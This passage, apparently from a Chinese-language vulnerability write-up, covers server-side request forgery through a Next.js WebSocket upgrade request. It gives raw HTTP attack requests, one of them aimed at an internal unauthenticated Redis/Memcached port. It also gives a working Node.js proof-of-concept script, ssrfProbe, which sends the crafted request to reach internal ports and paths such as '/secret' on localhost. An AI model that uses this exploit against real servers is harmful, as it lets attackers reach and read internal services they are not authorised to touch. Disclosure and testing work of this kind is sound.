      Sec-WebSocket-Version: 13
      Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
      ```
      
      #### 🎯 攻击内部 Redis / Memcached (未授权服务)
      
      ```
      GET http://127.0.0.1:6379/ HTTP/1.1
      Host: 127.0.0.1:${NEXTJS_PORT}
      Connection: Upgrade
      Upgrade: websocket
      Sec-WebSocket-Version: 13
      Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
      ```
      
      ---
      
      ### PoC脚本（Node.js）
      
      ```javascript
      const net = require('net');
      
      function ssrfProbe(nextPort, targetPort, targetPath = '/') {
        return new Promise((resolve, reject) => {
          const payload = Buffer.from(
            `GET http://127.0.0.1:${targetPort}${targetPath} HTTP/1.1\r\n` +
            `Host: 127.0.0.1:${nextPort}\r\n` +
            `Connection: Upgrade\r\n` +
            `Upgrade: websocket\r\n` +
            `Sec-WebSocket-Version: 13\r\n` +
            `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n`,
            'latin1'
          );
      
          const socket = net.createConnection({ host: '127.0.0.1', port: nextPort });
          const chunks = [];
      
          socket.on('connect', () => socket.write(payload));
          socket.on('data', (chunk) => chunks.push(chunk));
          socket.on('error', reject);
          socket.setTimeout(3000, () => socket.destroy());
          socket.on('close', () => resolve(Buffer.concat(chunks).toString()));
        });
      }
      
      // 使用: 探测本地 8080 端口
      ssrfProbe(3000, 8080, '/secret').then(console.log).catch(console.error);
      ```
      
